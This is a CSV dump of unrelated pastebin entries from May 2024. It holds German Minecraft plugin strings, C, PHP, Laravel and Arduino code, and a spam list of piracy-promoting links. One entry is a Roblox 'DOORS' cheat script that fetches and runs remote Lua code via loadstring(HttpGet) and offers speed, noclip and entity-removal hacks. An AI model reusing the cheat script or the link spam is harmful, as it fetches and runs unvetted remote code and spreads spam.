id,title,username,language,date,content
        ],
        ""death_message_necrotic_enemy"": [
          ""&f%player% zerfiel durch %killer%""
        ],
        ""death_message_necrotic"": [
          ""&f%player% zerfiel""
        ],
        ""death_message_bludgeoning_enemy"": [
          ""&f%player% wurde von %killer% zu Tode geprügelt""
        ],
        ""death_message_bludgeoning"": [
          ""&f%player% wurde zu Tode geprügelt""
        ],
        ""skilltree_icon_format"": [
          ""&7Level: &e%level_current%"",
          ""&7EP: &e%exp_current%&7/&e%exp_next%"",
          ""&7Gesamt-EP: &e%exp_total%"",
          ""&7Fertigkeitspunkte: &e%skillpoints%"",
          ""&7Prestigepunkte: &e%prestigepoints%""
        ],
        ""skilltree_perk_format"": [
          ""%description%"",
          ""&8&m                               "",
          ""&7Erfordert %skill% &7LV&e%level_required%"",
          ""&7%other_levels_required%"",
          ""%cost%"",
          ""&8&m                               "",
          ""%requireperk_one%"",
          ""%requireperk_all%"",
          ""%warning_levels%"",
          ""%warning_other_levels%"",
          ""%warning_all_perks%"",
          ""%warning_version%"",
          ""%warning_one_perks%"",
          ""%warning_cost%"",
          ""%status_unlockable%"",
          ""%status_unlocked%""
        ],
        ""immersive_recipe_button_format"": [
          ""&7Zeit: &e%crafting_time%s"",
          ""&eZutaten:"",
          ""%ingredients%"",
          ""&8&m                                   "",
          ""%modifiers%"",
          ""&8&m                                   "",
          ""&eUmschalten-Klicken, um das Rezept zu (ent)favorisieren""
        ],
        ""command_help_format"": [
          ""&8&m                              "",
          ""&7Befehl: &e%command%"",
          ""&7Beschreibung: &e%description%"",
          ""&7Berechtigung: &e%permissions%""
        ],
        ""party-info-format"": [
          ""&8[%level% &a%name%&8]"",
          ""&a%exp%&7/&a%exp_next%EP"",
          ""&aDescription&7: %description%"",
          """",
          ""&aPartei offen&7: &a%status_open%"",
          ""&aEP-Teilung&7: &a%status_exp_sharing%"",
          ""&aGegenstand-Teilung&7: &a%status_item_sharing%"",
          """",
          ""&aDein Rang&7: &a%rank%"",
          """",
          ""&7Mitglieder (&a%member_count%&7/&a%member_cap%&7)"",
          ""&a%member_list%""
        ],
        ""skill-level-up-power"": [
          ""TITLE(&7Du hast Level &e%level%&7 erreicht;Schau in &e/skills &7, um verfügbare Perks zu sehen;40;5)""
        ],
        ""skill-level-up-smithing"": [
          ""TITLE(&r;&eSchmieden&7 hat Level &e%level%&7 erreicht)"",
          ""&eSchmieden&7 hat Level &e%level%&7 erreicht""
        ],
        ""skill-level-up-mining"": [
          ""TITLE(&r;&cAbbauen&7 hat Level &c%level%&7 erreicht)"",
          ""&cAbbauen&7 hat Level &c%level%&7 erreicht""
        ],
        ""skill-level-up-light-weapons"": [
          ""TITLE(&r;&eLeichte Waffen&7 haben Level &e%level%&7 erreicht)"",
          ""&eLeichte Waffen&7 haben Level &e%level%&7 erreicht""
        ],
        ""skill-level-up-light-armor"": [
          ""TITLE(&r;&eLeichte Rüstung&7 hat Level &e%level%&7 erreicht)"",
          ""&eLeichte Rüstung&7 hat Level &e%level%&7 erreicht""
        ],
        ""skill-level-up-woodcutting"": [
          ""TITLE(&r;&aHolzfällen&7 hat Level &a%level%&7 erreicht)"",
          ""&aHolzfällen&7 hat Level &a%level%&7 erreicht""
        ],
        ""skill-level-up-digging"": [
          ""TITLE(&r;&aGraben&7 hat Level &a%level%&7 erreicht)"",
          ""&aGraben&7 hat Level &a%level%&7 erreicht""
        ],
        ""skill-level-up-heavy-weapons"": [
          ""TITLE(&r;&cSchwere Waffen&7 haben Level &c%level%&7 erreicht)"",
          ""&cSchwere Waffen&7 haben Level &c%level%&7 erreicht""
        ],
        ""skill-level-up-heavy-armor"": [
          ""TITLE(&r;&cSchwere Rüstung&7 hat Level &c%level%&7 erreicht)"",
          ""&cSchwere Rüstung&7 hat Level &c%level%&7 erreicht""
        ],
        ""skill-level-up-farming"": [
          ""TITLE(&r;&aFarming&7 hat Level &a%level%&7 erreicht)"",
          ""&aFarming&7 hat Level &a%level%&7 erreicht""
        ],
        ""skill-level-up-fishing"": [
          ""TITLE(&r;&bAngeln&7 hat Level &b%level%&7 erreicht)"",
          ""&bAngeln&7 hat Level &b%level%&7 erreicht""
        ],
        ""skill-level-up-enchanting"": [
          ""TITLE(&r;&bVerzaubern&7 hat Level &b%level%&7 erreicht)"",
          ""&bVerzaubern&7 hat Level &b%level%&7 erreicht""
        ],
        ""skill-level-up-archery"": [
          ""TITLE(&r;&eBogenschießen&7 hat Level &e%level%&7 erreicht)"",
          ""&eBogenschießen&7 hat Level &e%level%&7 erreicht""
        ],
        ""skill-level-up-alchemy"": [
          ""TITLE(&r;&dAlchemie&7 hat Level &d%level%&7 erreicht)"",
          ""&dAlchemie&7 hat Level &d%level%&7 erreicht""
        ],
        ""default_recipe_description_cooking"": [
          ""&e%input% &ezu %result% kochen""
        ],
        ""default_recipe_description_grid"": [
          ""%ingredients%"",
          ""&e="",
          ""&f%result%""
        ],
        ""default_recipe_description_smithing"": [
          ""&f%base% &e+ %addition% &e= &f%result%""
        ],
        ""default_recipe_description_brewing"": [
          ""&e%ingredient% &egebraut zu &e%applyon%"",
          ""&eErgibt %result%""
        ],
        ""default_recipe_description_immersive"": [
          ""%ingredients%"",
          """",
          ""&eErgibt %result%""
        ],
        ""default_recipe_description_immersive_tinker"": [
          ""&eHalte %input% &emit"",
          ""%ingredients%"",
          """",
          ""&eErgibt %result%""
        ],
        ""default_recipe_description_cauldron_catalyst"": [
          ""%ingredients%"",
          ""&eEinfügen von %catalyst%"",
          """",
          ""&eErgibt %result%""
        ],
        ""default_recipe_description_cauldron"": [
          ""%ingredients%"",
          """",
          ""&eErgibt %result%""
        ]
      },
      ""stringIndex"": {},
      ""stringListIndex"": {}
    }"
H4UCWtc3,DOORS F4 SCRIPT,PieGG,Lua,Saturday 4th of May 2024 11:20:49 AM CDT,"local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = ""F4Exploits [Doors]"", HidePremium = false, SaveConfig = true, ConfigFolder = ""f4doors""})

OrionLib:MakeNotification({
	Name = ""F4Exploits"",
	Content = ""Executed f4xdoors"",
	Image = ""rbxassetid://4483345998"",
	Time = 5
})

local Tab = Window:MakeTab({
	Name = ""Entities"",
	Icon = ""rbxassetid://4483345998"",
	PremiumOnly = false
})

local Tab3 = Window:MakeTab({
	Name = ""Misc"",
	Icon = ""rbxassetid://4483345998"",
	PremiumOnly = false
})

Tab3:AddButton({
	Name = ""Fullbright"",
	Callback = function()
      	for i,v in next, game.Lighting:GetChildren() do
           v:Destroy()
        end
game.Lighting.ClockTime = 12
game.Workspace.Camera.SkyboxPart:Remove()
  	end    
})

Tab3:AddButton({
	Name = ""Speed 20"",
	Callback = function()
        game[""Run Service""].RenderStepped:Connect(function()
      	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 20
        end)
  	end    
})

Tab3:AddButton({
	Name = ""No Footsteps"",
	Callback = function()
      	game.ReplicatedStorage.Footsteps:Remove()
        game.ReplicatedStorage.RemotesFolder.Footstep:Remove()
  	end    
})

Tab3:AddButton({
	Name = ""No Jumpscare (WIP)"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.Jumpscare:Remove()
  	end    
})

Tab3:AddButton({
	Name = ""No Entity Models (WIP)"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.Jumpscare:Remove()
  	end    
})

Tab:AddButton({
	Name = ""No Screech"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.Screech:Remove()
  	end    
})

Tab:AddButton({
	Name = ""No Greed"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.Greed:Remove()
  	end    
})

Tab:AddButton({
	Name = ""No Haste"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.Haste:Remove()
  	end    
})

Tab:AddButton({
	Name = ""No A-90"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.A90:Remove()
  	end    
})

Tab:AddButton({
	Name = ""No Dread"",
	Callback = function()
      	game.ReplicatedStorage.RemotesFolder.Dread:Remove()
  	end    
})

Tab3:AddButton({
	Name = ""Noclip (WIP)"",
	Callback = function()
      	game[""Run Service""].RenderStepped:Connect(function()
game.Players.LocalPlayer.Character.Collision.Size = Vector3.new(0.01,0.01,0.01)
game.Players.LocalPlayer.Character.Collision.CanCollide = false
end)
  	end    
})

game.Workspace.ChildAdded:Connect(function(child)
   OrionLib:MakeNotification({
	Name = ""F4Exploits"",
	Content = ""Entity Spawned ["" .. child.Name .. ""]"",
	Image = ""rbxassetid://4483345998"",
	Time = 5
})
end)"
dS8Q6kQ9,dsfgsegseg,gadungw71,PHP,Saturday 4th of May 2024 11:03:12 AM CDT,"•	https://www.imdb.com/list/ls545709974
•	https://www.imdb.com/list/ls545709879/
•	https://www.imdb.com/list/ls545708603/
•	https://www.imdb.com/list/ls545708681/
•	https://www.imdb.com/list/ls545750099/
•	https://www.artstation.com/artwork/obLGRL
•	https://www.artstation.com/phimvayhamketrungphat20246/profile
•	https://www.artstation.com/artwork/g0rNNP
•	https://www.artstation.com/vayham4fullhdvietsub3/profile
•	https://bento.me/phim-vay-ham-ke-trung-phat-vietsub
•	https://bento.me/phim-vay-ham-ke-trung-phat-2024-hd
•	https://www.kooapp.com/koo/guest_3NFOM8/7c3ff70d-6951-42d1-88eb-a5f92e078d22
•	https://open.firstory.me/user/clvs8lvvx000m01t6hkzhb2fk
•	https://open.firstory.me/story/clvs8ng2d125o01yeem4k9ltl
•	https://wandering.flarum.cloud/d/59433-engkautiada
•	https://hiuderyy.hashnode.dev/sghbtftnguymu
•	https://www.bankier.pl/forum/temat_angan-anganku,66157423.html.
•	https://medium.com/@rarawwwuu24/%EB%B2%94%EC%A3%84%EB%8F%84%EC%8B%9C-4-%EC%98%81%ED%99%94-%EC%A0%84%EC%B2%B4-%EC%98%81%ED%99%94-korean-%EC%A0%84%EC%B2%B4-%EB%B2%84%EC%A0%84-hd-%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C-2024-e45fac813b5d
•	https://www.onfeetnation.com/profiles/blogs/sukadandukakitajalani
•	https://forum.mush.com.br/topic/214334/xem-phim-v%C3%A2y-h%C3%A3m-4-k%E1%BA%BB-tr%E1%BB%ABng-ph%E1%BA%A1t-mi%E1%BB%85n-ph%C3%AD-online
•	https://hackmd.io/@rerewilli6/HJmBwAmM0
•	https://demo.hedgedoc.org/s/Q_NXPMhNX
•	https://rentry.co/85e3nfau
•	https://paste.ee/p/OOy7l
•	https://yamcode.com/sdfsedg-90
•	https://lifeisfeudal.com/Discussions/question/%EB%B2%94%EC%A3%84%EB%8F%84%EC%8B%9C-4-the-roundup-punishment-%EC%98%81%ED%99%94-%EC%98%A8%EB%9D%BC%EC%9D%B8-1080p
•	https://start.me/w/yOJrKm
•	https://plaza.rakuten.co.jp/aryasantosso/diary/202405050000/
•	https://telegra.ph/XCVXD-05-04
•	https://muckrack.com/rumit-runyem/bio
•	https://profile.hatena.ne.jp/gordon212/
•	https://www.bitsdujour.com/profiles/SS1TXO
•	http://aldenfamilydentistry.com/UserProfile/tabid/57/userId/745216/Default.aspx
•	https://www.fitlynk.com/1714838508F260157
"
fZiyVWJN,MC_IT_prevod_na_Q_cisla,majkl36,C,Saturday 4th of May 2024 11:00:44 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <math.h>

//vytvorenie aliasu pre datovy typ
typedef uint16_t UQ_t;
// saturovanie do maximalnej hodnoty 16-bitoveho Q cisla pri presiahnuti rozsahu Q cisla
UQ_t saturate(uint32_t x)
{
    if (x > 65535)
        return 65535;
    else
        return (uint16_t)x;
}
//prevod cisla s plavajucou desatinnou ciarkou na Q cislo
UQ_t float2Q (double realne, int n)
{
    UQ_t result = saturate((uint32_t)round(realne*(pow(2,n))));
    return result;
}
//prevod Q cisla na cislo s plavajucou desatinnou ciarkou
double Q2float (UQ_t q, int n)
{
    double result = q/(pow(2,n));
    return result;
}

//nasobenie dvoch Q cisel
UQ_t multQ(UQ_t a, UQ_t b,int n)
{
    UQ_t result;
    uint32_t temp;

    temp = (uint32_t)a * (uint32_t)b;
    result = saturate(temp >> n);

    return result;
}
//vypocet chyby nasobenia
double multQ_Err(UQ_t inQ, double inDouble, int n)
{
    return fabs((Q2float(inQ,n))-inDouble);
}
//telo programu
int main()
{
    int m,n;
    double inA[10];
    double inB[10];

    double errVal[10] = {0};
    UQ_t Qresult[10] = {0};
    double Fresult[10] = {0};
    double errSum = 0;
    double errAvg = 0;

    scanf(""%d %d"",&m,&n);

    double resolution = pow(2,(-n));
    for (int i=0; i<10; i++)
    {
        scanf (""%lf %lf"", &inA[i],&inB[i]);

        Qresult[i] = multQ(float2Q(inA[i],n),
                           float2Q(inB[i],n),
                           n);
        Fresult[i] = (inA[i]*inB[i]);

        errVal[i] = multQ_Err(Qresult[i],Fresult[i],n);

        errSum += errVal[i];

        errAvg = errSum/(i+1);
    }
    printf(""Priemerna chyba prevodu a nasobenia je %.*lf, co je "",n,errAvg);
    if (errAvg > resolution)
    {
        printf(""viac ako rozlisenie prevodu %.*lf."",n,resolution);
        return 0;
    }
    printf(""menej ako rozlisenie prevodu %.*lf."",n,resolution);
    return 0;
}
"
mgRJKD2d,Untitled,geminilabs,PHP,Saturday 4th of May 2024 10:39:12 AM CDT,"class Glsr_Fix_Assigned_Posts
{
    protected int $current;
    protected int $fixed;
    protected int $limit;

    public function __construct()
    {
        $this->current = 0;
        $this->fixed = 0;
        $this->limit = 100;
    }

    public function run()
    {
        if (!function_exists('glsr')) {
            return;
        }
        wp_raise_memory_limit('admin');
        glsr('Database')->beginTransaction('assigned_posts');
        while (true) {
            $results = $this->unassigned();
            if (empty($results)) {
                break;
            }
            $values = $this->prepareValues($results);
            if (!empty($values)) {
                glsr('Database')->insertBulk('assigned_posts', $values, [
                    'rating_id',
                    'post_id',
                    'is_published',
                ]);
                $this->fixed += count($values);
            }
        }
        glsr('Database')->finishTransaction('assigned_posts');
        glsr_log()->info(""{$this->fixed} review assignments fixed!"");
    }

    public function prepareValues(array $results): array
    {
        $values = [];
        foreach ($results as &$result) {
            $submitted = maybe_unserialize($result['submitted']);
            $postIds = \GeminiLabs\SiteReviews\Helpers\Arr::getAs('array', $submitted, 'assigned_posts');
            $postIds = glsr('Modules\Sanitizer')->sanitizePostIds($postIds);
            foreach ($postIds as $postId) {
                $isPublished = 'publish' === get_post_status($postId);
                $values[] = [
                    'rating_id' => (int) $result['rating_id'],
                    'post_id' => (int) $postId,
                    'is_published' => (int) $isPublished,
                ];
            }
        }
        $last = end($results);
        $this->current = $last['rating_id'] ?? 0;
        return $values;
    }

    public function unassigned(): array
    {
        $sql = ""
            SELECT r.ID AS rating_id, pm.meta_value AS submitted
            FROM table|ratings AS r
            INNER JOIN table|postmeta AS pm ON (pm.post_id = r.review_id)
            WHERE 1=1
            AND r.ID > %s
            AND r.ID NOT IN (
                SELECT apt.rating_id
                FROM table|assigned_posts apt
            )
            AND pm.meta_key = '_submitted'
            ORDER BY r.ID
            LIMIT 0, %d
        "";
        return glsr('Database')->dbGetResults(
            glsr('Database\Query')->sql($sql, $this->current, $this->limit),
            ARRAY_A
        );
    }
}

add_action('admin_init', function () {
	$command = new \Glsr_Fix_Assigned_Posts();
	$command->run();	
});
"
ZmMb7PPs,prosentase,nasrulkurniawan,PHP,Saturday 4th of May 2024 10:33:57 AM CDT,"public function hitungTriwulan($perspective, $indikator, $iku, $instansi, $unor, $unitkerja, $tahun, $bulan, $inputnilai)
    {
        $decodedIds = [
            Hashids::decode($perspective)[0] ?? null,
            Hashids::decode($indikator)[0] ?? null,
            Hashids::decode($iku)[0] ?? null,
            Hashids::decode($instansi)[0] ?? null,
            Hashids::decode($unor)[0] ?? null,
            Hashids::decode($unitkerja)[0] ?? null
        ];
        list($iddecodeprs, $iddecodeind, $iddecodeiku, $iddecodei, $iddecodeun, $iddecodeuk) = $decodedIds;

        // #01 - Mapping bulan ke triwulan dan semester
        $bulanTriwulan = [];
        $bulanSemester = [];
        for ($i = 1; $i <= 12; $i += 3) {
            if ($bulan >= sprintf('%02d', $i) && $bulan <= sprintf('%02d', $i + 2)) {
                $bulanTriwulan = [sprintf('%02d', $i), sprintf('%02d', $i + 1), sprintf('%02d', $i + 2)];
                $bulanSemester = ($i <= 6) ? ['01', '02', '03', '04', '05', '06'] : ['07', '08', '09', '10', '11', '12'];
                break;
            }
        }

        $kinerjas = Kinerjaorganisasi::where('mkoperspective_id', $iddecodeprs)
            ->where('mkoindikator_id', $iddecodeind)
            ->where('mkoiku_id', $iddecodeiku)
            ->where('instansi_id', $iddecodei)
            ->where('unor_id', $iddecodeuk)
            ->where('tahun', $tahun)
            ->whereIn('bulan', $bulanTriwulan)
            ->get()
            ->keyBy('bulan');

        $nilaiTriwulan = 0;
        foreach ($bulanTriwulan as $bln) {
            $nilaiBulan = ($bulan == $bln) ? $inputnilai : ($kinerjas->get($bln)->nilai ?? 0);
            $nilaiTriwulan += $nilaiBulan;
        }

        $target = Mkorencanatarget::where([
            ['instansi_id', $iddecodei],
            ['unor_id', $iddecodeun],
            ['unitkerja_id', $iddecodeuk],
            ['mkoperspective_id', $iddecodeprs],
            ['mkoindikator_id', $iddecodeind],
            ['mkoiku_id', $iddecodeiku],
            ['tahun', $tahun]
        ])->first();

        $triwulanTargetField = $target->{""tw"" . ceil(intval($bulan) / 3)};

        $prosentaseTriwulan = ($nilaiTriwulan / $triwulanTargetField) * 100;

        // #02 - Menentukan bulan-bulan untuk perhitungan akumulasi target sampai bulan yang dipilih
        $lastMonthOfSelectedQuarter = end($bulanTriwulan);
        $bulanSampaiTriwulanIni = range(1, intval($lastMonthOfSelectedQuarter));

        // Format bulan menjadi '01', '02', ..., '12'
        $bulanSampaiTriwulanIni = array_map(function($month) {
            return sprintf('%02d', $month);
        }, $bulanSampaiTriwulanIni);

        // Load kinerja dari Januari hingga bulan terakhir di triwulan yang dipilih
        $kinerjasSampaiTriwulanIni = Kinerjaorganisasi::where('mkoperspective_id', $iddecodeprs)
            ->where('mkoindikator_id', $iddecodeind)
            ->where('mkoiku_id', $iddecodeiku)
            ->where('instansi_id', $iddecodei)
            ->where('unor_id', $iddecodeuk)
            ->where('tahun', $tahun)
            ->whereIn('bulan', $bulanSampaiTriwulanIni)
            ->get()
            ->keyBy('bulan');

        // Menghitung nilai total dari Januari hingga bulan terakhir di triwulan yang dipilih
        $nilaiTotalSampaiTriwulanIni = 0;
        foreach ($bulanSampaiTriwulanIni as $bln) {
            $nilTotalSampaiTriwulanIni = ($bulan == $bln) ? $inputnilai : ($kinerjasSampaiTriwulanIni->get($bln)->nilai ?? 0);
            $nilaiTotalSampaiTriwulanIni += $nilTotalSampaiTriwulanIni;
        }

        // Menghitung prosentase target dari Januari hingga bulan terakhir di triwulan yang dipilih
        $triwulanTargetSampaiTriwulanIni = 0;
        for ($i = 1; $i <= ceil(intval($bulan) / 3); $i++) {
            $triwulanTargetSampaiTriwulanIni += $target->{""tw$i""};
        }
        $prosentaseTargetSampaiTriwulanIni = ($nilaiTotalSampaiTriwulanIni / $triwulanTargetSampaiTriwulanIni) * 100;

        // #03 - Menghitung nilai, target dan prosentasi semester
        $semesterIndex = (intval($bulan) <= 6) ? 'sem1' : 'sem2';
        $semesterTarget = floatval($target->{$semesterIndex} ?? 0);
        $nilaiSemester = 0;
        foreach ($bulanSemester as $bln) {
            $nilaiSemester += ($bulan == $bln) ? $inputnilai : ($kinerjas->get($bln)->nilai ?? 0);
        }
        $prosentaseSemester = $semesterTarget ? ($nilaiSemester / $semesterTarget) * 100 : 0; // Menangani pembagian dengan nol

        // #04 - Menghitung nilai, target dan prosentase sampai semester ini

        // Menentukan bulan-bulan untuk perhitungan akumulasi target sampai semester yang dipilih
        $lastMonthOfSelectedSemester = end($bulanSemester);
        $bulanSampaiSemesterIni = range(1, intval($lastMonthOfSelectedSemester));

        // Format bulan menjadi '01', '02', ..., '12'
        $bulanSampaiSemesterIni = array_map(function($month) {
            return sprintf('%02d', $month);
        }, $bulanSampaiSemesterIni);

        // Load kinerja dari Januari hingga bulan terakhir di semester yang dipilih
        $kinerjasSampaiSemesterIni = Kinerjaorganisasi::where('mkoperspective_id', $iddecodeprs)
            ->where('mkoindikator_id', $iddecodeind)
            ->where('mkoiku_id', $iddecodeiku)
            ->where('instansi_id', $iddecodei)
            ->where('unor_id', $iddecodeuk)
            ->where('tahun', $tahun)
            ->whereIn('bulan', $bulanSampaiSemesterIni)
            ->get()
            ->keyBy('bulan');

        // Menghitung nilai total dari Januari hingga bulan terakhir di semester yang dipilih
        $nilaiTotalSampaiSemesterIni = 0;
        foreach ($bulanSampaiSemesterIni as $bln) {
            $nilaiBulanSampaiSemesterIni = ($bulan == $bln) ? $inputnilai : ($kinerjasSampaiSemesterIni->get($bln)->nilai ?? 0);
            $nilaiTotalSampaiSemesterIni += $nilaiBulanSampaiSemesterIni;
        }

        // Menghitung target dan prosentase sampai semester ini
        $semesterTargetField = $target->{$semesterIndex}; // 'sem1' atau 'sem2' tergantung bulan
        $prosentaseTargetSampaiSemesterIni = ($nilaiTotalSampaiSemesterIni / $semesterTargetField) * 100;


        // #05 - Menghitung nilai total tahunan dan prosentase tahunan
        $nilaiTotalTahunan = 0;
        for ($i = 1; $i <= 12; $i++) {
            $bln = sprintf('%02d', $i);
            $nilaiBulan = ($bulan == $bln) ? $inputnilai : ($kinerjas->get($bln)->nilai ?? 0);
            $nilaiTotalTahunan += $nilaiBulan;
        }

        $targetTahunan = floatval($target->tahunan); // Mengambil target tahunan dari database
        $prosentaseTahunan = ($nilaiTotalTahunan / $targetTahunan) * 100; // Menghitung prosentase terhadap target tahunan


        return response()->json([
            'nilaiTriwulan' => $nilaiTriwulan,
            'targetTriwulan' => $triwulanTargetField,
            'targetTriwulanSampaiTriwulanIni' => $triwulanTargetSampaiTriwulanIni,
            'prosentaseTriwulan' => round($prosentaseTriwulan, 2),
            'prosentaseSampaiTriwulanIni' => round($prosentaseTargetSampaiTriwulanIni, 2),
            'nilaiSemester' => $nilaiSemester,
            'targetSemester' => $semesterTarget,
            'prosentaseSemester' => round($prosentaseSemester, 2),
            'nilaiTotalSampaiSemesterIni' => $nilaiTotalSampaiSemesterIni,
            'prosentaseTargetSampaiSemesterIni' => round($prosentaseTargetSampaiSemesterIni, 2),
            'targetTahunan' => $targetTahunan,
            'prosentaseTahunan' => round($prosentaseTahunan, 2)
        ]);
    }"
bihwyU0s,Scrolling Text rev_02,pleasedontcode,Arduino,Saturday 4th of May 2024 10:13:53 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Scrolling Text
	- Source Code compiled for: Arduino Uno
	- Source Code created on: 2024-05-04 15:13:08

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* display my name on the I2C moving from left to */
	/* right and back */
/****** END SYSTEM REQUIREMENTS *****/


/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <LiquidCrystal_I2C.h>  // https://github.com/marcoschwartz/LiquidCrystal_I2C

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t LCD1602I2C_I2C_PIN_SDA_A4 = A4;
const uint8_t LCD1602I2C_I2C_PIN_SCL_A5 = A5;
const uint8_t LCD1602I2C_I2C_SLAVE_ADDRESS = 0x27; // This is the I2C address, not 39

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
LiquidCrystal_I2C lcd(LCD1602I2C_I2C_SLAVE_ADDRESS, 20, 4); // Initialize the LCD object with the correct I2C address, columns, and rows

int position = 0; // Variable to store the position of the displayed text

void setup(void)
{
  // put your setup code here, to run once:
  lcd.init();
  lcd.backlight();
  lcd.setCursor(0, 0);
  lcd.print(""Your Name:""); // Display a label
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  lcd.setCursor(position, 1); // Set the cursor position for displaying name
  lcd.print(""Your Name""); // Display your name

  delay(300); // Delay for smooth movement

  lcd.setCursor(position, 1); // Clear the previous name
  lcd.print(""          ""); // Print spaces to clear the name

  if (position < 14) {
    position++; // Move the text to the right
  } else {
    position = 0; // Reset position to start from the left
  }
}

/* END CODE */"
4Qhfx6pX,Scrolling Text rev_01,pleasedontcode,Arduino,Saturday 4th of May 2024 10:12:52 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Scrolling Text
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-05-04 15:12:08

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* display my name on the I2C moving from left to */
	/* right and back */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <LiquidCrystal_I2C.h>  // https://github.com/marcoschwartz/LiquidCrystal_I2C

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t LCD1602I2C_I2C_PIN_SDA_A4 = A4;
const uint8_t LCD1602I2C_I2C_PIN_SCL_A5 = A5;
const uint8_t LCD1602I2C_I2C_SLAVE_ADDRESS = 0x27; // This is the I2C address, not 39

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
LiquidCrystal_I2C lcd(LCD1602I2C_I2C_SLAVE_ADDRESS, 20, 4); // Initialize the LCD object with the correct I2C address, columns, and rows

int position = 0; // Variable to store the position of the displayed text

void setup(void)
{
  // put your setup code here, to run once:
  lcd.init();
  lcd.backlight();
  lcd.setCursor(0, 0);
  lcd.print(""Your Name:""); // Display a label
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  lcd.setCursor(position, 1); // Set the cursor position for displaying name
  lcd.print(""Your Name""); // Display your name

  delay(300); // Delay for smooth movement

  lcd.setCursor(position, 1); // Clear the previous name
  lcd.print(""          ""); // Print spaces to clear the name

  if (position < 14) {
    position++; // Move the text to the right
  } else {
    position = 0; // Reset position to start from the left
  }
}

/* END CODE */"
